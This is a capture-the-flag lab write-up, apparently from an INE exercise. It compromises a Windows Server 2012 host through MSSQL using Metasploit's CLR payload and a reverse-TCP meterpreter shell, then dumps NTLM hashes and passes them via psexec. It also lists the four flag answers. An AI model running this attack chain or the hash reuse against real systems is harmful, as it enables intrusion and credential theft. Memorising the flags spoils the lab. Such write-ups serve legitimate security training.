# Domain Info
*Domain* : `target.ine.local`
*IP* : `10.5.29.38`
# flags
1) *flag1*:201952adb8354f40837d07b0ef8a9a55
2) *flag2*: 24ebf5caa7c4492885950772fe3197e6
3) *flag3*: f6dd2b229b974be4aff0548aad0c5629
4) *flag4*: b7c16f5014354b53b873e70a115f948c
# Enumeration
## *Nmap Scan*
### Port Scan
``` shell
- sudo nmap --min-rate 10000 -p- -sV target.ine.local
	PORT      STATE    SERVICE            VERSION
	135/tcp   open     msrpc              Microsoft Windows RPC
	139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open     microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	1433/tcp  open     ms-sql-s           Microsoft SQL Server 2012 11.00.6020; SP3
	3389/tcp  open     ssl/ms-wbt-server?
	5985/tcp  open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	47001/tcp open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	48799/tcp filtered unknown
	49152/tcp open     msrpc              Microsoft Windows RPC
	49153/tcp open     msrpc              Microsoft Windows RPC
	49154/tcp open     msrpc              Microsoft Windows RPC
	49155/tcp open     msrpc              Microsoft Windows RPC
	49180/tcp open     msrpc              Microsoft Windows RPC
	49181/tcp open     msrpc              Microsoft Windows RPC
	49190/tcp open     msrpc              Microsoft Windows RPC
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Service Scan
```shell
- sudo nmap -sSV -A -T4 -oX Scan.xml target.ine.local
	
	PORT      STATE SERVICE            VERSION
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	
	1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020.00; SP3
	| ms-sql-info: 
	|   10.5.29.38\MSSQLSERVER: 
	|     Instance name: MSSQLSERVER
	|     Version: 
	|       name: Microsoft SQL Server 2012 SP3
	|       number: 11.00.6020.00
	|       Product: Microsoft SQL Server 2012
	|       Service pack level: SP3
	|       Post-SP patches applied: false
	|     TCP port: 1433
	|_    Clustered: false
	| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
	| Not valid before: 2025-05-13T05:35:12
	|_Not valid after:  2055-05-13T05:35:12
	| ms-sql-ntlm-info: 
	|   10.5.29.38\MSSQLSERVER: 
	|     Target_Name: WIN-5BQ22OKH4SO
	|     NetBIOS_Domain_Name: WIN-5BQ22OKH4SO
	|     NetBIOS_Computer_Name: WIN-5BQ22OKH4SO
	|     DNS_Domain_Name: WIN-5BQ22OKH4SO
	|     DNS_Computer_Name: WIN-5BQ22OKH4SO
	|_    Product_Version: 6.3.9600
	|_ssl-date: 2025-05-13T05:47:02+00:00; 0s from scanner time.
	
	3389/tcp  open  ssl/ms-wbt-server?
	|_ssl-date: 2025-05-13T05:47:02+00:00; 0s from scanner time.
	| ssl-cert: Subject: commonName=WIN-5BQ22OKH4SO
	| Not valid before: 2025-01-08T07:08:38
	|_Not valid after:  2025-07-10T07:08:38
	| rdp-ntlm-info: 
	|   Target_Name: WIN-5BQ22OKH4SO
	|   NetBIOS_Domain_Name: WIN-5BQ22OKH4SO
	|   NetBIOS_Computer_Name: WIN-5BQ22OKH4SO
	|   DNS_Domain_Name: WIN-5BQ22OKH4SO
	|   DNS_Computer_Name: WIN-5BQ22OKH4SO
	|   Product_Version: 6.3.9600
	|_  System_Time: 2025-05-13T05:46:55+00:00
	
	49152/tcp open  msrpc              Microsoft Windows RPC
	49153/tcp open  msrpc              Microsoft Windows RPC
	49154/tcp open  msrpc              Microsoft Windows RPC
	49155/tcp open  msrpc              Microsoft Windows RPC
	
	Network Distance: 3 hops
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-time: 
	|   date: 2025-05-13T05:46:58
	|_  start_date: 2025-05-13T05:35:11
	| smb-security-mode: 
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   3:0:2: 
	|_    Message signing enabled but not required
	
```
## *Mysql Enum*
### BruteForce
```shell
# wordlists
users=/usr/share/metasploit-framework/data/wordlists/common_users.txt
passwords=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
 -> *Failed*
# Exploitation
## *Mssql Enum*
```shell
#msfconsole
use exploit/windows/mssql/mssql_clr_payload
set rhosts target.ine.local
set payload windows/x64/meterpreter/reverse_tcp
set lhost $lhost
run
# boom ! got session

# meterpreter
meterpreter > sysinfo
Computer        : WIN-5BQ22OKH4SO
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter >

cd C:\\
cat flag1.txt
201952adb8354f40837d07b0ef8a9a55

meterpreter > cd C:\\Windows\\system32\\config
meterpreter > cat flag2.txt
24ebf5caa7c4492885950772fe3197e6

meterpreter > search -d 'C:\\Windows\\system32\\' -f '*.txt'
Found 8 results...
==================

Path                                                                                                         Size (bytes)  Modified (UTC)
----                                                                                                         ------------  --------------
C:\\Windows\\system32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt          7563          2014-03-18 14:54:52 +0530
C:\\Windows\\system32\WindowsPowerShell\v1.0\en-US\default.help.txt                                          3568          2014-03-18 14:54:52 +0530
C:\\Windows\\system32\catroot2\dberr.txt                                                                     129815        2022-01-04 09:08:28 +0530
C:\\Windows\\system32\config\flag2.txt                                                                       34            2025-05-13 11:05:46 +0530
C:\\Windows\\system32\config\systemprofile\AppData\Local\Amazon\Ec2Config\Logs\FrameworkLaunchException.txt  579           2015-08-13 21:36:23 +0530
C:\\Windows\\system32\drivers\etc\EscaltePrivilageToGetThisFlag.txt                                          34            2025-05-13 11:05:46 +0530
C:\\Windows\\system32\drivers\gmreadme.txt                                                                   646           2013-06-18 20:11:47 +0530
C:\\Windows\\system32\en-US\erofflps.txt
```
# Post-Exploitation
## Administrator
```shell
# meterpreter
- getsystem
- hashdump
	
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	ssm-user:1011:aad3b435b51404eeaad3b435b51404ee:411c937747f35d8979cfa579ea75043b:::
```
*use psexec or metasploit's psexec*
```shell
# exploitation
use windows/smb/psexec
set SMBUSER administrator
set SMBPASS aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20

show targets > 2
run

# meterpreter
meterpreter > cat C:\\Windows\\system32\\drivers\\etc\\EscaltePrivilageToGetThisFlag.txt
f6dd2b229b974be4aff0548aad0c5629

# flag4

meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag4.txt
b7c16f5014354b53b873e70a115f948c
```